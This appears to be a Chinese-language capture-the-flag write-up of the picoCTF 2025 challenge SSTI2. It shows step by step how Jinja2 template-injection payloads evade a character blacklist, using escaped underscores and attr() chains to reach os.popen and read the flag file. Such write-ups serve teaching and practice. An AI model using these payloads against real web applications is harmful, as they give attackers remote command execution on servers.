##### tags:`picoCTF_2025`

# picoCTF Web : SSTI2

<style>
.red {
  color: red;
}
.blue {
  color: blue;
}
.purple {
  color: #7D3382;
}
.light_purple {
  color: #810cf5;
}
</style>

## <span class="red">**題目**</span>

- ![image](https://hackmd.io/_uploads/SkX_zExn1x.png)
- ![image](https://hackmd.io/_uploads/HyjnAIgnkg.png)

## <span class="red">**解題過程**</span>

1. **與 SSTI1 的差別在於，作者加入了 sanitization 的機制，擋掉了所有可能會有問題的字符，首先還是確認一下 ```{{7*7}}``` 的結果是否是 49 ，是就代表不需要更動大括號的部分**

- ![image](https://hackmd.io/_uploads/BJDOQPgn1l.png)

2. **確認過 ```{{7*7}}``` 仍然會是 49 ，接著我會想嘗試看看用全形試試看， payload 就像是
```{{ｃｏｎｆｉｇ.＿＿ｃｌａｓｓ＿＿.＿＿ｉｎｉｔ＿＿.＿＿ｇｌｏｂａｌｓ＿＿['\157\163']}}```
其中 ```\157\163``` 是 os 的八進制轉換(字母 → ASCII → 八進制)結果，會發現結果仍會被黑名單擋掉**

- ![image](https://hackmd.io/_uploads/SkRO-Pln1e.png)

&emsp;

3. **轉而試試 SSTI1 的另外一種解法會不會報錯，payload 是
```{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}``` ，發現會出問題**

&emsp;

4. **首先猜測是 ```.``` 出現問題，那就試試看把 ```.``` 換成 ```[]```
```{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('ls')['read']()}}```**

&emsp;

5. **還是有問題，所以接著把 ```_``` 拿掉換成 ```/x5f```
```{{request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('ls')['read']()}}```**

&emsp;

6. **最後沒辦法，試試看把 ```.``` , ```_``` , ```[]``` 都拿掉， payload 變成
```{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()}}```**

- ![image](https://hackmd.io/_uploads/SkCLP3r2kg.png)

&emsp;

7. **結果成功跑出來，所以就直接把 ```ls``` 改成 ```cat flag```
```{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}```**

- ![image](https://hackmd.io/_uploads/H1EsvhBnyx.png)
